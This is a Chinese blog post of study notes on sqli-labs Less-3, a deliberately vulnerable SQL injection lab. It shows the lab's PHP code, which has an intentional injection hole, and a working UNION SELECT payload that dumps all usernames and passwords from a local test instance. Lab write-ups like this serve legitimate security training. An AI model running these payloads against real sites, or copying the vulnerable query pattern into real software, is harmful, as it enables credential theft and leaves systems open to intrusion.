---
title: sqli-labs学习笔记_03
categories:
- sqli-labs
tags:
- sql注入
updated: 2018-06-06
---

**第三节：GET - Error based - Single quotes with twist string** (基于错误的GET单引号变形字符型注入)

可以在你的php文件中加上一句话:echo "你的sql语句是：

```php+HTML
echo "你的sql语句是：".$sql."<br>";
```

代码如下：

~~~php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-3 Error Based- String (with Twist) </title>

</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
echo "你的sql语句是：".$sql."<br>";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>


</font> </div></br></br></br><center>
<img src="../images/Less-3.jpg" /></center>
</body>
</html>

~~~



 当使用http://127.0.0.1/Less-3/?id=1的时候：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_03_01.png" />

然后在后面加上'看下 

<img src="{{ site.url }}/assets//blog_images/sqli-labs_03_02.png" />

sql语句报错

```sql
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";#这个是03的代码
```

```sql
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; #这个是02的代码
```

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; # 这个是01的代码
```

对比之后可以发现，03的代码中将id=('$id') ，这个是单引号注入变形

You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''1'') LIMIT 0,1' at  line 1 

这个是加入'之后的话，可以看出中间的错误''1'') LIMIT 0,1' 将两边的''去掉之后有:     **'1'') LIMIT 0,1**

这个就可以构造一下：

```
SELECT * FROM users WHERE id=('1') LIMIT 0,1
```

构造url：

http://127.0.0.1/Less-3/?id=1%27)--+

<img src="{{ site.url }}/assets//blog_images/sqli-labs_03_03.png" />

直接使用和01、02一样的方法既有：

`http://127.0.0.1/Less-3/?id=-1') union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users --+`

中间有很多的坑，都是慢慢来的，比如 --+  有时候会不小心写成—+  或者是少了）之类的，一定要有耐心



<img src="{{ site.url }}/assets//blog_images/sqli-labs_03_04.png" />



(个人学习笔记，部分转自互联网)













 








